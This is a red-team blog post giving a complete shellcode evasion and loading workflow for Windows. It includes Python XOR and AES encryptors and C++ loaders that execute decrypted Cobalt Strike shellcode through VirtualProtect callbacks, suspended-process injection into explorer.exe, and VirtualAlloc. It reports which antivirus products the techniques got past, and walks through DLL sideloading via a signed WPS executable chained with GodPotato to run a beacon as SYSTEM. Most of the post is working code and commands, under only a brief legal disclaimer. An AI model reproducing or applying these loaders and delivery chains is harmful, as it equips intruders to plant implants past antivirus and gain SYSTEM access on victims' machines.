---
title: "Shellcode Evasion and Loading: End-to-End Workflow"
date: 2026-07-28T23:10:00+08:00
draft: false
description: "From shellcode generation and XOR/AES encryption to VirtualProtect loading and DLL sideloading delivery—a complete red-team evasion workflow with two case studies."
categories: ["security"]
tags: ["red-team", "evasion", "shellcode", "dll-hijacking", "windows", "免杀"]
featuredImage: "/images/posts/shellcode-evasion-loading-workflow/featured.jpg"
featuredImagePreview: "/images/posts/shellcode-evasion-loading-workflow/featured.jpg"
lightgallery: true
toc:
  enable: true
  auto: true
# Force-load Mermaid when CF build skips LoveIt Scratch-based injection
library:
  js:
    mermaid: https://cdn.jsdelivr.net/npm/mermaid@11.5.0/dist/mermaid.min.js
---

Whether extracted from an EXE/Beacon via donut or generated directly from Cobalt Strike, shellcode is typically XOR/AES-encrypted and then executed through a standalone loader or a sideloaded DLL. This post walks through the full chain—generation, encryption, loading, and delivery—with two practical case studies.

<!--more-->

{{< admonition warning "Legal Notice" >}}
For authorized penetration testing, security research, and defensive assessment only. Do not use on unauthorized systems.
{{< /admonition >}}

## Overview

{{< mermaid >}}
flowchart LR
    subgraph S1["1 Generate Shellcode"]
        A1["EXE / Beacon"] --> A2["donut / go-donut"]
        A3["Cobalt Strike"] --> A4["C shellcode / .bin"]
        A2 --> B["Raw shellcode"]
        A4 --> B
    end

    subgraph S2["2 Encrypt"]
        B --> C{"Algorithm"}
        C --> C1["XOR"]
        C --> C2["AES"]
        C --> C3["RSA (ref)"]
        C1 --> D[".dat / .ini"]
        C2 --> D
        C3 --> D
    end

    subgraph S3["3 Load / Deliver"]
        D --> E1["Manual loader<br/>VirtualProtect / VirtualAlloc"]
        D --> E2["DLL sideload decrypt & run"]
        D --> E3["Off-the-shelf Go loader"]
        E2 --> F["Signed EXE triggers callback"]
        E1 --> G["Standalone EXE"]
        E3 --> G
    end
{{< /mermaid >}}

For DLL hijacking fundamentals, see the published article: [Windows DLL Hijacking Analysis](https://blog.leeissonba.com/posts/windows-dll-hijacking-analysis/).

## 1. Generate Shellcode

### 1.1 Extract from EXE (donut / go-donut)

**go-donut** (bin output only): [Binject/go-donut](https://github.com/Binject/go-donut)

```bash
./go-donut -i windows_amd64.exe   # extension required, otherwise bin is unusable
```

**donut** (recommended): [TheWover/donut](https://github.com/TheWover/donut)

```bash
# -f 3: C-style shellcode; -z 2: compression
donut.exe -i windows_i386.exe -f 3 -z 2
```

{{< admonition warning "Architecture match" >}}
Shellcode bitness must match the **process that executes it**. If sideload host `et.exe` is x64, CS/donut output must be x64; x86 shellcode in an x64 process will crash.
{{< /admonition >}}

### 1.2 Generate from Cobalt Strike

1. CS → **Attacks → Packages → Payload Generator** (for C-format shellcode; **Windows Executable (S)** produces an EXE, not the byte array used here)
2. Choose **C** output: `unsigned char buf[] = "\x90\x90...";`
3. For the Python encryptor in this post: produce a raw binary `.bin` (do **not** only strip `\x` and leave hex ASCII text; convert `\xHH` to bytes, or export/convert to bin)
4. Encrypt (Section 2), then deliver via sideloaded DLL or standalone loader

## 2. Encryption

### 2.1 XOR

#### Python (encrypt)

```python
import sys

def xor_encrypt(shellcode, key):
    encrypted_shellcode = bytearray()
    key_len = len(key)
    for i in range(len(shellcode)):
        encrypted_shellcode.append(shellcode[i] ^ key[i % key_len])
    return encrypted_shellcode

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 ShellcodeEncrypt.py <payload.bin> <payload.dat>")
        return

    with open(sys.argv[1], "rb") as file:
        shellcode = bytearray(file.read())

    key = bytearray(b'henry123456aa+-==@asd')
    encrypted_shellcode = xor_encrypt(shellcode, key)

    with open(sys.argv[2], "wb") as output_file:
        output_file.write(encrypted_shellcode)

if __name__ == '__main__':
    main()
```

#### C++ (decrypt)

```cpp
#include <Windows.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>

void* FileToMem(const WCHAR* FilePath, _Out_ DWORD& BufSize)
{
    FILE* file;
    if (_wfopen_s(&file, FilePath, L"rb") != 0 || !file)
        return nullptr;

    fseek(file, 0, SEEK_END);
    BufSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    void* RetVoid = malloc(BufSize);
    if (!RetVoid) {
        fclose(file);
        return nullptr;
    }

    fread(RetVoid, 1, BufSize, file);
    fclose(file);
    return RetVoid;
}

// Read encrypted shellcode from a .dat file matching the executable name
WCHAR szFilePath[MAX_PATH + 1] = { 0 };
GetModuleFileName(NULL, szFilePath, MAX_PATH);
lstrcpyW((szFilePath + (lstrlenW(szFilePath) - 3)), L"dat");

DWORD size;
void* buffer = FileToMem(szFilePath, size);

if (buffer) {
    char* shellcode = new char[size];
    memcpy(shellcode, buffer, size);
    free(buffer);

    const char key[] = "henry123456aa+-==@asd";
    int keylength = strlen(key);

    for (DWORD i = 0; i < size; i++) {
        shellcode[i] ^= key[i % keylength];
    }
    // shellcode decrypted, length = size
}
```

### 2.2 AES

Dependency: [tiny-AES-c](https://github.com/kokke/tiny-AES-c) (add `aes.c`, `aes.h`, `aes.hpp` to your project)

#### Python (encrypt)

{{< admonition note "Dependency" >}}
Install `pycryptodome`: `pip uninstall crypto pycrypto && pip install pycryptodome`
{{< /admonition >}}

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import sys

def main():
    key = b'0123456789abcdef'
    iv = b'0123456789abcdef'

    if len(sys.argv) != 3:
        print("Usage: python3 shellcodeAESenc.py <payload.bin> <payload.dat>")
        return

    with open(sys.argv[1], "rb") as file:
        shellcode = bytearray(file.read())

    print("Original Shellcode Size:", len(shellcode))

    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(shellcode, AES.block_size)
    encrypt = cipher.encrypt(padded_data)

    with open(sys.argv[2], "wb") as output_file:
        output_file.write(encrypt)

if __name__ == '__main__':
    main()
```

#### C/C++ (decrypt)

```cpp
#include <Windows.h>
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include "aes.hpp"

void* FileToMem(const WCHAR* FilePath, _Out_ DWORD& BufSize)
{
    FILE* file;
    if (_wfopen_s(&file, FilePath, L"rb") != 0 || !file)
        return nullptr;

    fseek(file, 0, SEEK_END);
    BufSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    void* RetVoid = malloc(BufSize);
    if (!RetVoid) {
        fclose(file);
        return nullptr;
    }

    fread(RetVoid, 1, BufSize, file);
    fclose(file);
    return RetVoid;
}

int main() {
    WCHAR szFilePath[MAX_PATH + 1] = { 0 };
    GetModuleFileName(NULL, szFilePath, MAX_PATH);
    lstrcpyW((szFilePath + (lstrlenW(szFilePath) - 3)), L"dat");

    DWORD size;
    void* buffer = FileToMem(szFilePath, size);

    if (buffer) {
        char* shellcode = new char[size];
        memcpy(shellcode, buffer, size);
        free(buffer);

        // Exactly 16 bytes; do not use a string literal (adds trailing '\0')
        unsigned char key[16] = {
            '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'
        };
        unsigned char iv[16] = {
            '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'
        };
        // Ciphertext is padded; originSize MUST be the Original Shellcode Size printed by the encryptor
        DWORD originSize = 36999;  // example only—replace with your value
        unsigned char* ushellcode = reinterpret_cast<unsigned char*>(shellcode);

        struct AES_ctx ctx;
        AES_init_ctx_iv(&ctx, key, iv);
        // size must be a multiple of 16 (matches Python pad output)
        AES_CBC_decrypt_buffer(&ctx, ushellcode, size);

        DWORD dwOldPro = 0;
        VirtualProtect(ushellcode, originSize, PAGE_EXECUTE_READWRITE, &dwOldPro);
        EnumUILanguages((UILANGUAGE_ENUMPROC)(char*)ushellcode, 0, 0);

        // Do not delete[] if shellcode stays resident (e.g. beacon)
    }
}
```

### 2.3 RSA

Reference: [RSA shellcode encryption (WeChat article)](https://mp.weixin.qq.com/s/jkdQwRzmNGmCJztN4KBztw)

## 3. Loading Techniques

### 3.1 VirtualProtect + callback execution

{{< admonition note "Callback execution" >}}
APIs like `EnumUILanguages` invoke shellcode as a callback. Arguments are passed; most PIC shellcode ignores them. If the payload stays resident (beacon), **do not** `delete[]` / `free` that buffer afterward.
{{< /admonition >}}

```cpp
char* shellcode = ...;
DWORD size = ...;

DWORD dwOldPro = 0;
VirtualProtect(shellcode, size, PAGE_EXECUTE_READWRITE, &dwOldPro);
EnumUILanguages((UILANGUAGE_ENUMPROC)shellcode, 0, 0);
// Resident shellcode: do not free here
```

### 3.2 Suspended-process injection (傀儡进程)

> Flow: create suspended process → remote alloc/write shellcode → `SetThreadContext` to change entry → resume.  
> This is **not** classic Process Hollowing (unmap original image and replace the PE).

{{< admonition warning "AV differences" >}}
Does not evade Avast in testing; did evade Windows Defender. Sample below is **x86** (`Eip`); on x64 use `Rip` and a same-arch target process.
{{< /admonition >}}

```cpp
char* shellcode = ...;
DWORD size = ...;

PROCESS_INFORMATION ProcessInformation = {};
STARTUPINFOA StartupInfo = {};
void* remote = nullptr;
CONTEXT Context = {};
DWORD DwWrite = 0;

StartupInfo.cb = sizeof(StartupInfo);

// CREATE_SUSPENDED; command line must be a writable buffer (not a string literal)
char cmdLine[] = "C:\\Windows\\explorer.exe";
BOOL result = CreateProcessA(
    nullptr, cmdLine, nullptr, nullptr, FALSE, CREATE_SUSPENDED,
    nullptr, nullptr, &StartupInfo, &ProcessInformation
);

if (result) {
    Context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(ProcessInformation.hThread, &Context);
    remote = VirtualAllocEx(
        ProcessInformation.hProcess, nullptr, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    WriteProcessMemory(ProcessInformation.hProcess, remote, shellcode, size, &DwWrite);
    Context.Eip = (DWORD)(uintptr_t)remote;  // x86 only
    SetThreadContext(ProcessInformation.hThread, &Context);
    ResumeThread(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hThread);
    CloseHandle(ProcessInformation.hProcess);
}

delete[] shellcode;
```

### 3.3 VirtualAlloc + direct call

```cpp
char* shellcode = ...;
DWORD size = ...;

LPVOID allocatedMemory = VirtualAlloc(
    NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
);
if (allocatedMemory == NULL) {
    delete[] shellcode;
    return;
}

memcpy(allocatedMemory, shellcode, size);
void(*shellcodeFunction)() = (void(*)())allocatedMemory;
shellcodeFunction();
// Resident shellcode: do not VirtualFree(allocatedMemory, ...)
```

## 4. Off-the-Shelf Loaders

| Tool | Notes |
|------|-------|
| [Gllloader](https://github.com/INotGreen/Gllloader) | C/C++, C#, Nim, PowerShell loaders |
| [GobypassAV-shellcode](https://github.com/Pizz33/GobypassAV-shellcode) | Go shellcode loader (results vary by AV version; verify yourself) |

{{< admonition tip "Field note" >}}
In one test, remote loading evaded Defender (2023-07-13); treat as a snapshot, not a lasting claim.
{{< /admonition >}}

**Recommended Go build (smaller footprint):**

```bash
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-w -s -H windowsgui" -o out.exe
```

**Default build (more likely to be flagged):**

```bash
GOOS=windows GOARCH=amd64 go build
```

## 5. Case Studies

### 5.1 CS Shellcode + Encryption + DLL Sideloading

Typical chain: **CS shellcode → XOR to disk → malicious DLL decrypts & runs → signed EXE triggers load**.

{{< mermaid >}}
flowchart TD
    A["Cobalt Strike C shellcode"] --> B["Save as .bin"]
    B --> C["ShellcodeEncrypt.py XOR"]
    C --> D["Encrypted file<br/>e.g. et.dat"]
    E["Find signed EXE (e.g. WPS et.exe)"] --> F["AheadLib parses original DLL"]
    F --> G["VS malicious DLL<br/>read → decrypt → execute"]
    D --> G
    G --> H["Deploy together<br/>signed EXE + DLL + encrypted file"]
    H --> I["Run signed EXE → callback"]
{{< /mermaid >}}

See [Windows DLL Hijacking Analysis](https://blog.leeissonba.com/posts/windows-dll-hijacking-analysis/) for hijacking mechanics.

#### Step 1: Find a suitable signed EXE

WPS `et.exe` depends on a co-located DLL—drop a malicious DLL with the same name to hijack loading.

{{< image src="/images/posts/shellcode-evasion-loading-workflow/01-wps-white-exe.png" caption="Signed EXE example (WPS)" >}}
{{< image src="/images/posts/shellcode-evasion-loading-workflow/02-wps-dll-deps.png" caption="DLL dependency" >}}

#### Step 2: Build the malicious DLL

1. Parse the original DLL with **AheadLib**

{{< image src="/images/posts/shellcode-evasion-loading-workflow/03-aheadlib-1.png" caption="AheadLib DLL parse" >}}
{{< image src="/images/posts/shellcode-evasion-loading-workflow/04-aheadlib-2.png" caption="Generated export stubs" >}}

2. Create a VS DLL project and import the generated code

{{< image src="/images/posts/shellcode-evasion-loading-workflow/05-vs-dll-project-1.png" caption="New VS DLL project" >}}
{{< image src="/images/posts/shellcode-evasion-loading-workflow/06-vs-dll-project-2.png" caption="Import AheadLib output" >}}

3. In an export or a **deferred** path: **read encrypted file → XOR decrypt → execute** (Sections 2–3)

{{< admonition warning "Do not run heavy work in DllMain" >}}
`DllMain` (`DLL_PROCESS_ATTACH`) holds the loader lock—avoid loading the CLR, complex sync, or running GodPotato / donut .NET shellcode there. Common pattern: `CreateThread` to decrypt/execute on a new thread, or run from an export after `LoadLibrary` returns.
{{< /admonition >}}

4. Build settings:
   - asm file → Custom Build Tool
   - C/C++ → Code Generation → Runtime Library → **/MT**
   - C/C++ → Precompiled Headers → **Not Using**
   - Linker → Debugging → Generate Debug Info → **No**
   - Platform must match the signed EXE (**Win32 / x64**)

#### Step 3: Generate and encrypt shellcode

1. Export C-format via **Payload Generator**, then convert to raw `.bin` for the encryptor

{{< image src="/images/posts/shellcode-evasion-loading-workflow/07-cs-shellcode.png" caption="CS C-format shellcode" >}}

2. XOR encrypt; save under the **exact filename** your DLL expects

{{< admonition note "Filename contract" >}}
Section 2’s sample rewrites the host EXE extension to `.dat` via `GetModuleFileName` (e.g. `et.exe` → `et.dat`). If the DLL hardcodes `xx.ini`, the ciphertext must be named `xx.ini`. Mismatch → read failure.

XOR with the **same** key an **even** number of times is a no-op; an **odd** count equals one pass. Multi-layer XOR needs **different** keys and reverse-order decrypt.
{{< /admonition >}}

{{< image src="/images/posts/shellcode-evasion-loading-workflow/08-xor-encrypt.png" caption="XOR-encrypted output" >}}

```bash
python3 ShellcodeEncrypt.py payload.bin et.dat
```

#### Step 4: Deploy

Place **signed EXE + malicious DLL + encrypted shellcode** in the same directory and run the signed EXE.

{{< image src="/images/posts/shellcode-evasion-loading-workflow/09-deploy.png" caption="Co-located deployment" >}}

{{< admonition note "Go DLL" >}}
In a Go DLL you can kick off work from `init()`, but avoid heavy work under the loader lock—prefer `init()` only starting a goroutine/thread, with decrypt/execute in that worker. Also mind the Go runtime and c-shared export setup.
{{< /admonition >}}

```go
func init() {
    // Prefer: go func() { read .dat → decrypt → execute }()
    // Do not synchronously run CLR-heavy logic in init
}
```

### 5.2 GodPotato + DLL Sideloading

Project: [GodPotato](https://github.com/BeichenDream/GodPotato)

**Chain:** in a session that **already meets potato prerequisites**, sideload runs GodPotato shellcode → GodPotato elevates to SYSTEM → starts beacon.

{{< admonition warning "GodPotato prerequisites" >}}
GodPotato needs **SeImpersonatePrivilege** on the current token (common for service accounts, IIS app pools, SQL Server agent, etc.). A normal desktop user double-clicking `et.exe` **usually cannot** reach SYSTEM. Sideloading solves delivery/execution, not unconditional privilege escalation.
{{< /admonition >}}

{{< admonition tip "Roles" >}}
- **Sideload package (`et.exe` + malicious DLL + `et.dat`)**: decrypts and runs GodPotato shellcode in the current (SeImpersonate-capable) context.
- **GodPotato `cmd`**: points at **beacon** (or another payload to run as SYSTEM)—**not** the same `et.exe`.
- **donut’d GodPotato**: CLR/.NET loader shellcode—run outside DllMain (e.g. `CreateThread`); see §5.1.
{{< /admonition >}}

{{< mermaid >}}
flowchart TD
    A["Patch GodPotato: hardcode beacon path"] --> B["Build newgod.exe"]
    B --> C["donut → loader.bin"]
    C --> D["ShellcodeEncrypt.py"]
    D --> E["Rename to et.dat"]
    E --> H["Deploy together"]
    F["et.exe + krpt.dll"] --> H
    G["beacon.exe"] --> H
    H --> I["Run et.exe in SeImpersonate-capable context"]
    I --> J["DLL runs GodPotato (not heavy work in DllMain)"]
    J --> K["Elevate and run beacon → SYSTEM session"]
{{< /mermaid >}}

#### Step 1: Hardcode the beacon command

```csharp
potatoArgs = new newgodArgs
{
    // Point at beacon on the target—not the signed et.exe
    cmd = "cmd /c c:\\users\\public\\downloads\\beacon.exe"
};
```

Build as `newgod.exe`.

#### Step 2: Extract shellcode with donut

```dos
donut.exe -i newgod.exe
```

Sample output:

```text
[ Shellcode     : "loader.bin"
[ File type     : .NET EXE
[ Target CPU    : x86+amd64
```

#### Step 3: Encrypt shellcode

```bash
python3 ShellcodeEncrypt.py loader.bin loader.dat
```

Rename `loader.dat` to the name your loader expects (e.g. `et.dat`).

#### Step 4: Deploy

Place these in the **same directory** (beacon path must match Step 1), e.g. `C:\Users\Public\Downloads`:

| File | Role |
|------|------|
| `et.exe` | Signed EXE that triggers DLL load |
| `krpt.dll` | Malicious DLL: read `et.dat` → decrypt → execute |
| `et.dat` | Encrypted GodPotato shellcode |
| `beacon.exe` | Payload GodPotato starts after elevation |

Run `et.exe`: DLL decrypts/runs GodPotato shellcode at a safe time (not heavy work in DllMain) → (with SeImpersonate) elevates → runs `beacon.exe` as **SYSTEM**.

{{< admonition note "Beacon on disk" >}}
A plaintext `beacon.exe` on disk may still be caught by AV. In practice you often re-apply evasion to the beacon or keep it in-memory-only. This section only shows how GodPotato hooks into the sideload chain.
{{< /admonition >}}
